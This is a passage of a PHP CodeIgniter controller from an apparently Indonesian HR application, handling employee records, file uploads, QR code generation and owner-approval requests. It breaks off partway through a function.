<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Karyawan extends MY_Controller {

	public function __construct()
	{
		parent::__construct();
		$this->load->model('master/Karyawan_model', "karyawanModel");
		$this->load->model('pekerjaborongan/Pekerja_model',"pekerjaModel");
		$this->load->model('approval/Tmp_karyawan_model',"tmpKaryawanModel");
		$this->load->model('Setting_model',"settingModel");
	}

	public function index()
	{
		parent::checkLoginUser(); // user login autentic checking

		parent::headerTitle("Master Data > Karyawan","Master Data","Karyawan");
		$breadcrumbs = array(
							"Master Data"	=>	site_url('master/karyawan'),
							"Karyawan"		=>	"",
						);
		parent::breadcrumbs($breadcrumbs);
		$data = array();
		$setting = $this->settingModel->getById(1);
		$data['qrcode'] = $setting->qrcode;
		$data['logo'] = $setting->logo;
		$data['nama_perusahaan'] = $setting->nama_perusahaan;
		parent::viewData($data);
		parent::viewMaster();
	}

	public function ajax_list()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$data = array();

			$orderBy = array(null,null,null,"idfp","nama","tempat_lahir","tgl_lahir","kelamin","telepon","master_jabatan.jabatan","alamat","status_kerja");
			$search = array("idfp","nama","tempat_lahir","tgl_lahir","kelamin","telepon","master_jabatan.jabatan","alamat","status_kerja");

			$result = $this->karyawanModel->findDataTable($orderBy,$search);
			foreach ($result as $item) {

				$srcPhoto = base_url().'assets/images/default/no_user.png';
				if ($item->foto != "") {
					$srcPhoto = base_url()."uploads/master/karyawan/orang/".$item->foto;
				}
				$dataPhoto = '<a href="'.$srcPhoto.'" data-toggle="lightbox" data-title="Photo Karyawan" data-footer="">
                    <img src="'.$srcPhoto.'" class="img-circle" style="height:60px; width:60px;" alt="photo "'.$item->nama.'>
                </a>';

				$item->tgl_lahir = date_ind("d M Y", $item->tgl_lahir);
				$item->kelamin = ucfirst($item->kelamin);

				$item->foto = $dataPhoto;

				$btnAction = '<button class="btn btn-outline-info btn-mini" title="Detail" onclick="btnDetail('.$item->id.')"><i class="icofont icofont-ui-zoom-in"></i></button>';

				$btnAction .= '&nbsp;&nbsp;&nbsp;<button class="btn btn-outline-secondary btn-mini" title="QRcode" onclick="btnQRcode('.$item->id.')"><i class="icofont icofont-qr-code"></i></button>';

				$btnAction .= '<br><br><button class="btn btn-outline-warning btn-mini" title="Edit" onclick="btnEdit('.$item->id.')"><i class="fa fa-pencil-square-o"></i></button>';

				$btnAction .= '&nbsp;&nbsp;&nbsp;<button class="btn btn-outline-danger btn-mini" title="Hapus" onclick="btnDelete('.$item->id.')"><i class="fa fa-trash-o"></i></button>';


				$item->button_action = $btnAction;
				$data[] = $item;
			}
			return $this->karyawanModel->findDataTableOutput($data,$search);
		}
	}

	public function qrCodeGenerate($id)
	{
		// $this->load->library('qr_code');

		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getData = $this->karyawanModel->getById($id); // untuk check qrcode_file
			$getId = $this->karyawanModel->getById($id); // untuk tampilian view qrcide_file
			if ($getId) {
				$srcPhoto = base_url().'assets/images/default/no_user.png';
				if ($getId->foto != "") {
					$srcPhoto = base_url()."uploads/master/karyawan/orang/".$getId->foto;
				}
				$getId->foto = $srcPhoto;

				$srcQrCode = base_url("/")."assets/images/default/empty_file.png";
				if ($getData->qrcode_file != "") {
					if (!file_exists("uploads/master/karyawan/qrcode/".$getData->qrcode_file)) {
						$qrcodeUpload = self::qrCodeGenerateUpload($getData->kode_karyawan,$getData->qrcode_file);
						$this->response->file_exists = "tidak ada qrcode_file";
						$this->response->qrcode_upload = $qrcodeUpload;
					} else {
						$this->response->file_exists = "ada qrcode_file";
					}
					$srcQrCode = base_url()."uploads/master/karyawan/qrcode/".$getId->qrcode_file;
				} else {
					$image_name = md5(uniqid().$getData->kode_karyawan).'.png'; //buat name dari qr code sesuai dengan kodeKaryawan
					self::qrCodeGenerateUpload($getData->kode_karyawan,$image_name);
					$update = $this->karyawanModel->update($id,array("qrcode_file" => $image_name));
					if ($update) {
						$getData = $this->karyawanModel->getById($id);
						$srcQrCode = base_url()."uploads/master/karyawan/qrcode/".$getData->qrcode_file;
					}
				}
				$getId->qrcode_file = $srcQrCode;

				/*$this->qr_code->text($getId->kode_karyawan);
				$imgQrcode = '<img style="margin-top: -15px; margin-left: 190px; height: 66px; width: 62px;" class="img-fluid" src="'.$this->qr_code->get_link(80).'" alt="qrcode-card-img">';
				// $getId->qr_code = $this->qr_code->get_link(80);
				$getId->qr_code = $imgQrcode;*/

				$this->response->status = true;
				$this->response->message = "QRcode generate success";
				$this->response->data = $getId;
			} else {
				$this->response->message = alertDanger("Data tidak ada.");
			}
		}
		parent::json();
	}

	public function setFormValidate()
	{
		$this->form_validation->set_rules('nama', 'Nama Karyawan', 'trim|required');
		$this->form_validation->set_rules('alamat', 'Alamat', 'trim|required');
		$this->form_validation->set_rules('tempat_lahir', 'Tempat Lahir', 'trim|required');
		$this->form_validation->set_rules('tgl_lahir', 'Tanggal Lahir', 'trim|required');
		$this->form_validation->set_rules('telepon', 'Telepon', 'trim|required');
		$this->form_validation->set_rules('email', 'Email', 'trim|valid_email');
		$this->form_validation->set_rules('no_wali', 'No Telp/HP Wali', 'trim');
		$this->form_validation->set_rules('jenis_kelamin', 'Jenis Kelamin', 'trim|required');
		$this->form_validation->set_rules('status_pernikahan', 'Status Pernikahan', 'trim|required');
		$this->form_validation->set_rules('pendidikan', 'Pendidikan', 'trim|required');
		$this->form_validation->set_rules('kewarganegaraan', 'Kewarganegaraan', 'trim|required');
		$this->form_validation->set_rules('agama', 'Agama', 'trim|required');
		$this->form_validation->set_rules('cabang', 'Cabang', 'trim|required'); // kemungkinan gak di pakai
		$this->form_validation->set_rules('departemen', 'Departemen', 'trim|required');
		$this->form_validation->set_rules('jabatan', 'Jabatan', 'trim|required');
		$this->form_validation->set_rules('tunjangan_jabatan', 'Tunjangan Jabatan', 'trim|required');
		$this->form_validation->set_rules('golongan', 'Golongan', 'trim|required');
		$this->form_validation->set_rules('shift', 'Shift', 'trim|required');
		$this->form_validation->set_rules('group', 'Group', 'trim|required');
		$this->form_validation->set_rules('tgl_masuk_kerja', 'Tanggal Masuk Kerja', 'trim|required');
		$this->form_validation->set_rules('status_kontrak', 'Status Kontrak', 'trim|required');
		$this->form_validation->set_rules('ibu_kandung', 'Nama Ibu Kandung', 'trim|required');
		$this->form_validation->set_rules('npwp', 'NPWP', 'trim');
		$this->form_validation->set_rules('nilai_gaji', 'Nilai Gaji', 'trim');
		$this->form_validation->set_rules('periode_gaji', 'Periode Gaji', 'trim|required');
		$this->form_validation->set_rules('no_rekening', 'No Rekening', 'trim');
		$this->form_validation->set_rules('bank', 'Bank', 'trim');
		$this->form_validation->set_rules('atas_nama', 'Atas Nama', 'trim');
		$this->form_validation->set_rules('otoritas', 'Otoritas', 'trim|required');
		$this->form_validation->set_rules('status_kerja', 'Status kerja', 'trim|required');

	}

	public function _do_upload_orang()
	{
		$config['upload_path']      = 	'uploads/master/karyawan/orang/';
        $config['allowed_types']    = 	'gif|jpg|jpeg|png';
        $config['max_size']         = 	1024; // 1mb
        $config['encrypt_name']		=	true;

        $this->load->library('upload', $config);
        $this->upload->initialize($config);
	}

	public function _do_upload_kontrak()
	{
		$config['upload_path']      = 	'uploads/master/karyawan/kontrak/';
        $config['allowed_types']    = 	'gif|jpg|jpeg|png|pdf';
        $config['max_size']         = 	1024; // 1mb
        $config['encrypt_name']		=	true;

        $this->load->library('upload', $config);
        $this->upload->initialize($config);
	}

	public function add($batasKaryawan=false)
	{
		parent::checkLoginUser(); // user login autentic checking

		$no_id  = $this->input->post('no_id');
		$nama = $this->input->post('nama');
		$alamat = $this->input->post('alamat');
		$tempat_lahir = $this->input->post('tempat_lahir');
		$tgl_lahir = $this->input->post('tgl_lahir');
		$telepon = $this->input->post('telepon');
		$email = $this->input->post('email');
		$no_wali = $this->input->post('no_wali');
		$jenis_kelamin = $this->input->post('jenis_kelamin');
		$status_pernikahan = $this->input->post('status_pernikahan');
		$pendidikan = $this->input->post('pendidikan');
		$kewarganegaraan = $this->input->post('kewarganegaraan');
		$agama =  $this->input->post('agama');
		$cabang = $this->input->post('cabang'); // kemungkinan gak di pakai
		$departemen = $this->input->post('departemen');
		$jabatan = $this->input->post('jabatan');
		$tunjangan_jabatan = $this->input->post('tunjangan_jabatan');
		$golongan = $this->input->post('golongan');
		$shift = $this->input->post('shift');
		// $nama_shift = $this->input->post('nama_shift');
		$group = $this->input->post('group');
		$tgl_masuk_kerja = $this->input->post('tgl_masuk_kerja');
		$status_kontrak = $this->input->post('status_kontrak');
		$start_date = $this->input->post('start_date');
		$expired_date = $this->input->post('expired_date');
		$ibu_kandung = $this->input->post('ibu_kandung');
		$suami_istri = $this->input->post('suami_istri');
		$jumlah_tanggungan = $this->input->post('jumlah_tanggungan');
		$npwp = $this->input->post('npwp');
		$nilai_gaji = $this->input->post('nilai_gaji');
		$periode_gaji = $this->input->post('periode_gaji');
		$no_rekening = $this->input->post('no_rekening');
		$bank = $this->input->post('bank');
		$atas_nama = $this->input->post('atas_nama');
		$otoritas = $this->input->post('otoritas');
		$status_kerja =$this->input->post('status_kerja');
		$status_face =$this->input->post('status_face');


		if ($this->isPost()) {
			$this->form_validation->set_rules('no_id', 'Nomor Induk Karyawan', 'trim|required|is_unique[master_karyawan.idfp]');
			self::setFormValidate();

			if ($status_face == null) {
				$status_face = 0;
			}

			if ($status_pernikahan == "Menikah") {
				$this->form_validation->set_rules('suami_istri', 'Nama Suami / Istri', 'trim|required');
				$this->form_validation->set_rules('jumlah_tanggungan', 'Jumlah Tanggungan', 'trim|required');
			}

			if ($status_kontrak == "iya") {
				$this->form_validation->set_rules('start_date', 'Awal Kontrak', 'trim|required');
				$this->form_validation->set_rules('expired_date', 'Akhir Kontrak', 'trim|required');
			}

			if ($this->form_validation->run() == true) {
				if ($otoritas == 2) {
					$checkGroupKabag = $this->karyawanModel->checkGroupKabag($group);
				} else {
					$checkGroupKabag = false;
				}

				if ($checkGroupKabag) {
					$this->response->message = alertDanger("Opps Maaf, Group yang anda pilih sudah ada otoritas kabag nya.! <b> Silahkan ganti group lain atau ganti otoritas.!");
				} else {
					$data  = array(
									"idfp"			=>	strtoupper($no_id),
									"kode_karyawan"	=>	"NO-KODE",
									"nama"			=>	ucfirst($nama),
									"alamat"		=>	$alamat,
									"tempat_lahir"	=>	$tempat_lahir,
									"tgl_lahir"		=>	$tgl_lahir,
									"telepon"		=>	$telepon,
									"email"			=>	$email,
									"no_wali"		=>	$no_wali,
									"kelamin"		=>	$jenis_kelamin,
									"status_nikah"	=>	$status_pernikahan,
									"pendidikan"	=>	$pendidikan,
									"wn"			=>	$kewarganegaraan,
									"agama"			=>	$agama,
									"id_cabang"		=>	$cabang,
									"id_departemen"	=>	$departemen,
									"id_jabatan"	=>	$jabatan,
									"jab_index"		=>	$tunjangan_jabatan,
									"id_golongan"	=>	$golongan,
									"shift"			=>	$shift,
									// "nama_shift"	=>	$nama_shift,
									"id_grup"		=>	$group,
									"tgl_masuk"		=>	$tgl_masuk_kerja,
									"kontrak"		=>	$status_kontrak,
									"ibu_kandung"	=>	$ibu_kandung,
									"suami_istri"	=> 	$suami_istri,
									"tanggungan"	=>	$jumlah_tanggungan,
									"npwp"			=>	$npwp,
									"gaji"			=>	$nilai_gaji,
									"periode_gaji"	=>	$periode_gaji,
									"rekening"		=>	$no_rekening,
									// "id_bank"		=>	$bank,
									"atas_nama"		=>	$atas_nama,
									"otoritas"		=>	$otoritas,
									"status_kerja"	=>	$status_kerja,
									"wajah" => $status_face,
									"status_approve"=>	"Proses",
									"info_approve"	=>	"tambah",
									"judul_approve"	=>	"Tambah Karyawan Baru"
							);
					if ($bank > 0) {
						$data["id_bank"] = $bank;
					}

					if($status_kontrak == "iya") {
						$data["start_date"]		= 	$start_date;
						$data["expired_date"]	=	$expired_date;
					} else {
						$data["start_date"]		= NULL;
						$data["expired_date"]	= NULL;
					}

					$checkDuplicateTmp = $this->tmpKaryawanModel->getByWhere($data);
					if($checkDuplicateTmp && $checkDuplicate->status_approve == "Proses") {
						$this->response->message = alertDanger("Opps, Maaf data karyawan yang anda tambahkan sudah ada. <br> Dan sedang menunggu approval owner.!");
					} else {
						$data["tanggal_approve"] = date("Y-m-d");
						$data["user_id"] = $this->user->id_pengguna;

						$error_photo_karyawan = "";
						$error_file_kontrak = "";

						/*for foto karyawan*/
						if (!empty($_FILES["photo_karyawan"]["name"])) {
							// config upload
							self::_do_upload_orang();

							if (!$this->upload->do_upload("photo_karyawan")) {
								$this->response->message = "error_foto";
								$error_photo_karyawan = $this->upload->display_errors('<small style="color:red;">', '</small>');
								$this->response->error_photo_karyawan = $error_photo_karyawan;
							} else {
								$photo_karyawan = $this->upload->data();
								$data["foto"]	= $photo_karyawan["file_name"];
							}

						} else {
							$data["foto"]	= "";
						}

						if($status_kontrak == "iya") {
							/*for file kontrak*/
							if (!empty($_FILES["file_kontrak"]["name"])) {
								// config upload
								self::_do_upload_kontrak();
								if($error_photo_karyawan == "") {
									if (!$this->upload->do_upload("file_kontrak")) {
										$this->response->message = "error_foto";
										$error_file_kontrak = $this->upload->display_errors('<small style="color:red;">', '</small>');
										$this->response->error_file_kontrak = $error_file_kontrak;
									} else {
										$file_kontrak = $this->upload->data();
										$data["file_kontrak"]	= $file_kontrak["file_name"];
									}
								}
							} else {
								$data["file_kontrak"]	= "";
							}
						} else {
							$data["file_kontrak"]	= "";
						}

						if ($error_photo_karyawan == "" ||  $error_file_kontrak == "") {

							$dataNotif = array(
												"keterangan"=> 	" Tambah data karyawan baru.",
												"user_id"	=>	$this->user_id,
												"level"		=>	"owner",
												"url_direct"=>	"approvalowner/karyawan",
											);

							if ($batasKaryawan) {
								$getCountKaryawan1 = $this->karyawanModel->getCountKaryawan();
								$getCountKaryawan2 = $this->pekerjaModel->getCountKaryawan();
								$getCountKaryawan = $getCountKaryawan1 + $getCountKaryawan2;
								/*var_dump($getCountKaryawan);
								var_dump($batasKaryawan);
								exit();*/
								if ($getCountKaryawan >= $batasKaryawan) {
									$this->response->message = alertDanger("Opps, Maaf Anda tidak boleh menambah karyawan lagi.<br>Batas karyawan yang boleh di tambah hanya <b>".$batasKaryawan."</b> karyawan saja.");
								} else {
									$insert = $this->tmpKaryawanModel->insert($data,$dataNotif);
									if ($insert) {
										/*notif firebase*/
										parent::insertNotif($dataNotif);
										// parent::sendNotifTopic("owner","payroll",$this->username.$dataNotif["keterangan"]);
										parent::sendNotifTopic("owner","Pengajuan Karyawan","HRD menambahkan data karyawan baru","010");
										$this->response->status = true;
										$this->response->message = alertSuccess("Berhasil proses Tambah Data karyawan dan menunggu approval dari owner.");
									} else {
										$this->response->message = alertDanger("Gagal, tambah data karyawan.");
									}
								}
							} else {
								$insert = $this->tmpKaryawanModel->insert($data,$dataNotif);
								if ($insert) {
									/*notif firebase*/
									parent::insertNotif($dataNotif);
									// parent::sendNotifTopic("owner","payroll",$this->username.$dataNotif["keterangan"]);
									parent::sendNotifTopic("owner","Pengajuan Karyawan","HRD menambahkan data karyawan baru","010");

									$this->response->status = true;
									$this->response->message = alertSuccess("Berhasil proses Tambah Data karyawan dan menunggu approval dari owner.");
								} else {
									$this->response->message = alertDanger("Gagal, tambah data karyawan.");
								}
							}

						}
					}
				}
			} else {
				$this->response->message = validation_errors('<li class="pull-left"><span class="text-danger">', '</span></li><br>');
			}
		}
		parent::json();
	}

	public function getId($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getData = $this->karyawanModel->getById($id);
			if ($getData) {
				$getData->tgl_lahir_indo = date_ind("d M Y", $getData->tgl_lahir);
				$getData->tgl_masuk_indo = date_ind("d M Y", $getData->tgl_masuk);
				$getData->start_date_indo = date_ind("d M Y", $getData->start_date);
				$getData->expired_date_indo = date_ind("d M Y", $getData->expired_date);

				if ($getData->foto != "") {
					$getData->foto = base_url("/")."uploads/master/karyawan/orang/".$getData->foto;
				} else {
					$getData->foto = base_url("/")."assets/images/default/no_user.png";
				}

				if ($getData->file_kontrak != "") {
					$getData->file_kontrak = base_url("/")."uploads/master/karyawan/kontrak/".$getData->file_kontrak;
				} else {
					$getData->file_kontrak = base_url("/")."assets/images/default/no_file_.png";
				}

				if ($getData->shift == "ya") {
					$getData->shift_text = "Ya <u>( Pagi, Sore, Malam )</u>";
				} else {
					$getData->shift_text = "Tidak <u>( Regular )</u>";
				}

				$getData->gaji_rp = "Rp.".number_format($getData->gaji,0,",",".");

				$this->response->status = true;
				$this->response->message = "Data by id karyawan";
				$this->response->data = $getData;
			} else {
				$this->response->message = alertDanger("Data karyawan tidak ada.");
			}
		}
		parent::json();
	}

	public function update($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		$this->load->library('ciqrcode');

		$no_id  = $this->input->post('no_id');
		$nama = $this->input->post('nama');
		$alamat = $this->input->post('alamat');
		$tempat_lahir = $this->input->post('tempat_lahir');
		$tgl_lahir = $this->input->post('tgl_lahir');
		$telepon = $this->input->post('telepon');
		$email = $this->input->post('email');
		$no_wali = $this->input->post('no_wali');
		$jenis_kelamin = $this->input->post('jenis_kelamin');
		$status_pernikahan = $this->input->post('status_pernikahan');
		$pendidikan = $this->input->post('pendidikan');
		$kewarganegaraan = $this->input->post('kewarganegaraan');
		$agama =  $this->input->post('agama');
		$cabang = $this->input->post('cabang'); // kemungkinan gak di pakai
		$departemen = $this->input->post('departemen');
		$jabatan = $this->input->post('jabatan');
		$tunjangan_jabatan = $this->input->post('tunjangan_jabatan');
		$golongan = $this->input->post('golongan');
		$shift = $this->input->post('shift');
		// $nama_shift = $this->input->post('nama_shift');
		$group = $this->input->post('group');
		$tgl_masuk_kerja = $this->input->post('tgl_masuk_kerja');
		$status_kontrak = $this->input->post('status_kontrak');
		$start_date = $this->input->post('start_date');
		$expired_date = $this->input->post('expired_date');
		$ibu_kandung = $this->input->post('ibu_kandung');
		$suami_istri = $this->input->post('suami_istri');
		$jumlah_tanggungan = $this->input->post('jumlah_tanggungan');
		$npwp = $this->input->post('npwp');
		$nilai_gaji = $this->input->post('nilai_gaji');
		$periode_gaji = $this->input->post('periode_gaji');
		$no_rekening = $this->input->post('no_rekening');
		$bank = $this->input->post('bank');
		$atas_nama = $this->input->post('atas_nama');
		$otoritas = $this->input->post('otoritas');
		$status_kerja =$this->input->post('status_kerja');
		$status_face =$this->input->post('status_face');

		if ($this->isPost()) {

			$getById = $this->karyawanModel->getById($id);
			$checkTmp = $this->tmpKaryawanModel->getByWhere(array("kode_karyawan" => $getById->kode_karyawan),"created_at DESC");
			if($checkTmp && $checkTmp->status_approve == "Proses") {
				$this->response->message = alertDanger("Opps, Maaf Tidak bisa melakukan Update. <br> data yang anda pilih sudah di update sebelumnya,<br> dan belum di approval owner.");
			} else {
				self::setFormValidate();

				if ($status_face == null) {
					$status_face = 0;
				}

				if ($status_pernikahan == "Menikah") {
					$this->form_validation->set_rules('suami_istri', 'Nama Suami / Istri', 'trim|required');
					$this->form_validation->set_rules('jumlah_tanggungan', 'Jumlah Tanggungan', 'trim|required');
				}

				if ($status_kontrak == "iya") {
					$this->form_validation->set_rules('start_date', 'Awal Kontrak', 'trim|required');
					$this->form_validation->set_rules('expired_date', 'Akhir Kontrak', 'trim|required');
				}

				if ($this->form_validation->run() == true) {

					$data  = array(
									"idfp"			=>	$getById->idfp,
									"kode_karyawan"	=>	$getById->kode_karyawan,
									"nama"			=>	ucfirst($nama),
									"alamat"		=>	$alamat,
									"tempat_lahir"	=>	$tempat_lahir,
									"tgl_lahir"		=>	$tgl_lahir,
									"telepon"		=>	$telepon,
									"email"			=>	$email,
									"no_wali"		=>	$no_wali,
									"kelamin"		=>	$jenis_kelamin,
									"status_nikah"	=>	$status_pernikahan,
									"pendidikan"	=>	$pendidikan,
									"wn"			=>	$kewarganegaraan,
									"agama"			=>	$agama,
									"id_cabang"		=>	$cabang,
									"id_departemen"	=>	$departemen,
									"id_jabatan"	=>	$jabatan,
									"jab_index"		=>	$tunjangan_jabatan,
									"id_golongan"	=>	$golongan,
									"shift"			=>	$shift,
									"id_grup"		=>	$group,
									"tgl_masuk"		=>	$tgl_masuk_kerja,
									"kontrak"		=>	$status_kontrak,
									"ibu_kandung"	=>	$ibu_kandung,
									"suami_istri"	=> 	$suami_istri,
									"tanggungan"	=>	$jumlah_tanggungan,
									"npwp"			=>	$npwp,
									"gaji"			=>	$nilai_gaji,
									"periode_gaji"	=>	$periode_gaji,
									"rekening"		=>	$no_rekening,
									// "id_bank"		=>	$bank,
									"atas_nama"		=>	$atas_nama,
									"otoritas"		=>	$otoritas,
									"status_kerja"	=>	$status_kerja,
									"wajah" => $status_face,
									"tanggal_approve"=>	date("Y-m-d"),
									"status_approve"=>	"Proses",
									"info_approve"	=>	"edit",
									"judul_approve"	=>	"Update data karyawan",
									"user_id"		=>	$this->user->id_pengguna
							);

					if ($bank > 0) {
						$data["id_bank"] = $bank;
					}

					$error_photo_karyawan = "";
					$error_file_kontrak = "";

					/*for foto karyawan*/
					if (!empty($_FILES["photo_karyawan"]["name"])) {
						// config upload
						self::_do_upload_orang();

						if (!$this->upload->do_upload("photo_karyawan")) {
							$this->response->message = "error_foto";
							$error_photo_karyawan = $this->upload->display_errors('<small style="color:red;">', '</small>');
							$this->response->error_photo_karyawan = $error_photo_karyawan;
						} else {
							$photo_karyawan = $this->upload->data();
							$data["foto"]	= $photo_karyawan["file_name"];
							/*if (file_exists("uploads/master/karyawan/orang/".$getById->foto) && $getById->foto) {
								unlink("uploads/master/karyawan/orang/".$getById->foto);
							}*/
						}

					} else {
						$data["foto"]	= $getById->foto;
						if ($this->input->post("is_delete_photo") == 1) {
							$data["foto"]	= "";
							/*if (file_exists("uploads/master/karyawan/orang/".$getById->foto) && $getById->foto) {
								unlink("uploads/master/karyawan/orang/".$getById->foto);
							}*/
						}
					}

					if($status_kontrak == "iya") {

						$data["start_date"]		= 	$start_date;
						$data["expired_date"]	=	$expired_date;

						/*for file kontrak*/
						if (!empty($_FILES["file_kontrak"]["name"])) {
							// config upload
							self::_do_upload_kontrak();
							if($error_photo_karyawan == "") {
								if (!$this->upload->do_upload("file_kontrak")) {
									$this->response->message = "error_foto";
									$error_file_kontrak = $this->upload->display_errors('<small style="color:red;">', '</small>');
									$this->response->error_file_kontrak = $error_file_kontrak;
								} else {
									$file_kontrak = $this->upload->data();
									$data["file_kontrak"]	= $file_kontrak["file_name"];
									/*if (file_exists("uploads/master/karyawan/kontrak/".$getById->file_kontrak) && $getById->file_kontrak) {
										unlink("uploads/master/karyawan/kontrak/".$getById->file_kontrak);
									}*/
								}
							}
						} else {
							$data["file_kontrak"]	= $getById->file_kontrak;
							if ($this->input->post("is_delete_kontrak") == 1) {
								$data["file_kontrak"]	= "";
								/*if (file_exists("uploads/master/karyawan/kontrak/".$getById->file_kontrak) && $getById->file_kontrak) {
									unlink("uploads/master/karyawan/kontrak/".$getById->file_kontrak);
								}*/
							}
						}
					} else {
						$data["start_date"]		= 	NULL;
						$data["expired_date"]	=	NULL;
						/*if (file_exists("uploads/master/karyawan/kontrak/".$getById->file_kontrak) && $getById->file_kontrak) {
							unlink("uploads/master/karyawan/kontrak/".$getById->file_kontrak);
						}*/
					}

					/*var_dump($data);
					exit();*/

					if ($error_photo_karyawan == "" ||  $error_file_kontrak == "") {

						if ($getById->qrcode_file == "") {
							$image_name = md5(uniqid().$getById->kode_karyawan).'.png'; //buat name dari qr code sesuai dengan kodeKaryawan
							self::qrCodeGenerateUpload($getById->kode_karyawan,$image_name);
							$data["qrcode_file"] = $image_name;
						} else if ($getById->qrcode_file != "") {
							if (!file_exists("uploads/master/karyawan/qrcode/".$getById->qrcode_file)) {
								self::qrCodeGenerateUpload($getById->kode_karyawan,$getById->qrcode_file);
								$data["qrcode_file"] = $getById->qrcode_file;
							}
						}

						$dataNotif = array(
											"keterangan"=> 	" Edit/update data karyawan dengan nama=<u>".$getById->nama."</u> dan no_induk=<u>".$getById->idfp."</u>",
											"user_id"	=>	$this->user_id,
											"level"		=>	"owner",
											"url_direct"=>	"approvalowner/karyawan",
										);

						/*var_dump($data);
						exit();*/
						$update = $this->tmpKaryawanModel->insert($data,$dataNotif);
						if ($update) {
							/*notif firebase*/
							parent::insertNotif($dataNotif); // for notif website
							$keteranganBody = $this->username." Edit/update data karyawan dengan nama=".$getById->nama." dan no_induk=".$getById->idfp;
							parent::sendNotifTopic("owner","Pengajuan Edit Karyawan","HRD Edit data karyawan ","008"); // for notif android

							$this->response->status = true;
							$this->response->message = alertSuccess("Berhasil proses update Data karyawan dan menunggu approval dari owner.");
						} else {
							$this->response->message = alertDanger("Gagal, update data karyawan.");
						}
					}
				} else {
					$this->response->message = validation_errors('<li class="pull-left"><span class="text-danger">', '</span></li><br>');
				}
			}
		}
		parent::json();
	}

	public function qrCodeGenerateUpload($kodeKaryawan,$nameImage)
	{
		$this->load->library('ciqrcode');

		$config['cacheable']	= true; //boolean, the default is true
		$config['cachedir']		= './uploads/'; //string, the default is application/cache/
		$config['errorlog']		= './uploads/'; //string, the default is application/logs/
		$config['imagedir']		= './uploads/master/karyawan/qrcode/'; //direktori penyimpanan qr code
		$config['quality']		= true; //boolean, the default is true
		$config['size']			= '1024'; //interger, the default is 1024
		$config['black']		= array(224,255,255); // array, default is array(255,255,255)
		$config['white']		= array(70,130,180); // array, default is array(0,0,0)
		$this->ciqrcode->initialize($config);

		$params['data'] = $kodeKaryawan; //data yang akan di jadikan QR CODE
		$params['level'] = 'H'; //H=High
		$params['size'] = 10;
		$params['savename'] = FCPATH.$config['imagedir'].$nameImage; //simpan image QR CODE ke folder assets/images/
		return $this->ciqrcode->generate($params); // fungsi untuk generate QR CODE
	}

	public function delete($id)
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$getById = $this->karyawanModel->getById($id);
			if ($getById) {
				$checkTmp = $this->tmpKaryawanModel->getByWhere(array("kode_karyawan" => $getById->kode_karyawan),"created_at DESC");
				if($checkTmp && $checkTmp->status_approve == "Proses") {
					$this->response->message = alertDanger("Opps, Maaf Tidak bisa melakukan Hapus. <br> data yang anda pilih sudah di update sebelumnya,<br> dan belum di approval owner.");
				} else {
					$data  = array(
									"idfp"			=>	$getById->idfp,
									"kode_karyawan"	=>	$getById->kode_karyawan,
									"nama"			=>	$getById->nama,
									"alamat"		=>	$getById->alamat,
									"tempat_lahir"	=>	$getById->tempat_lahir,
									"tgl_lahir"		=>	$getById->tgl_lahir,
									"telepon"		=>	$getById->telepon,
									"email"			=>	$getById->email,
									"no_wali"		=>	$getById->no_wali,
									"kelamin"		=>	$getById->kelamin,
									"status_nikah"	=>	$getById->status_nikah,
									"pendidikan"	=>	$getById->pendidikan,
									"wn"			=>	$getById->wn,
									"agama"			=>	$getById->agama,
									"id_cabang"		=>	$getById->id_cabang,
									"id_departemen"	=>	$getById->id_departemen,
									"id_jabatan"	=>	$getById->id_jabatan,
									"jab_index"		=>	$getById->jab_index,
									"id_golongan"	=>	$getById->id_golongan,
									"shift"			=>	$getById->shift,
									"id_grup"		=>	$getById->id_grup,
									"tgl_masuk"		=>	$getById->tgl_masuk,
									"kontrak"		=>	$getById->kontrak,
									"ibu_kandung"	=>	$getById->ibu_kandung,
									"suami_istri"	=> 	$getById->suami_istri,
									"tanggungan"	=>	$getById->tanggungan,
									"npwp"			=>	$getById->npwp,
									"gaji"			=>	$getById->gaji,
									"periode_gaji"	=>	$getById->periode_gaji,
									"rekening"		=>	$getById->rekening,
									"id_bank"		=>	$getById->id_bank,
									"atas_nama"		=>	$getById->atas_nama,
									"otoritas"		=>	$getById->otoritas,
									"status_kerja"	=>	$getById->status_kerja,
									"foto"			=>	$getById->foto,
									"file_kontrak"	=>	$getById->file_kontrak,
									"qrcode_file"	=>	$getById->qrcode_file,
									"tanggal_approve"=>	date("Y-m-d"),
									"status_approve"=>	"Proses",
									"info_approve"	=>	"hapus",
									"judul_approve"	=>	"Hapus data karyawan",
									"user_id"		=>	$this->user->id_pengguna
							);
					$dataNotif = array(
											"keterangan"=> 	" Hapus data karyawan dengan nama=<u>".$getById->nama."</u> dan no_induk=<u>".$getById->idfp."</u>",
											"user_id"	=>	$this->user_id,
											"level"		=>	"owner",
											"url_direct"=>	"approvalowner/karyawan",
										);

					$delete = $this->tmpKaryawanModel->insert($data,$dataNotif);
					if ($delete) {
						/*notif firebase*/
						parent::insertNotif($dataNotif);
						$keteranganBody = $this->username." Hapus data karyawan dengan nama=".$getById->nama." dan no_induk=".$getById->idfp;
						// parent::sendNotifTopic("owner","payroll",$keteranganBody);
						parent::sendNotifTopic("owner","Pengajuan Hapus Karyawan","HRD Hapus data karyawan baru","009");
						/*if (file_exists("uploads/master/karyawan/orang/".$getById->foto) && $getById->foto) {
							unlink("uploads/master/karyawan/orang/".$getById->foto);
						}

						if (file_exists("uploads/master/karyawan/kontrak/".$getById->file_kontrak) && $getById->file_kontrak) {
							unlink("uploads/master/karyawan/kontrak/".$getById->file_kontrak);
						}

						if (file_exists("uploads/master/karyawan/qrcode/".$getById->qrcode_file) && $getById->qrcode_file) {
							unlink("uploads/master/karyawan/qrcode/".$getById->qrcode_file);
						}*/

						$this->response->status = true;
						$this->response->message = alertSuccess("Berhasil proses hapus Data karyawan dan menunggu approval dari owner.");
					} else {
						$this->response->message = alertDanger("Gagal, hapus data..");
					}
				}
			} else {
				$this->response->message = alertDanger("Data sudah tidak ada.");
			}
		}
		parent::json();
	}

	public function allCabangAjax()
	{
		parent::checkLoginUser(); // user login autentic checking

		if ($this->isPost()) {
			$table = "master_cabang";
			$select = "id_cabang, cabang";
			$orderBy = "cabang ASC";
			if (!isset($_POST["searchTerm"])) {
